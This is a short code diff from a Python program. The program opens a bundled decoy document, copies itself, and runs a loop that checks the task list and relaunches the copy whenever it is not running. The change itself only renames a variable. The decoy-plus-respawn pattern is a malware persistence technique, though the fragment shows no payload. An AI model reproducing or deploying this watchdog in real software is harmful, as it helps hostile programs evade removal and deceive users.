@@ -84,7 +84,7 @@ if __name__ == '__main__':
         os.startfile(get_resource_path("CALMDOWN.doc"))
         sleep(5)
 
-        copy: str = copy()
+        copyaddr = copy()
         t1 = Thread(target=runw)
         t1.start()
 
@@ -92,4 +92,4 @@ if __name__ == '__main__':
             output = run(['tasklist'], shell=True, capture_output=True).stdout
             c = str(output).find(f'{file_name}copy.exe')
             if c == -1:
-                Popen([copy, f'{file_name}copy'])
+                Popen([copyaddr, f'{file_name}copy'])
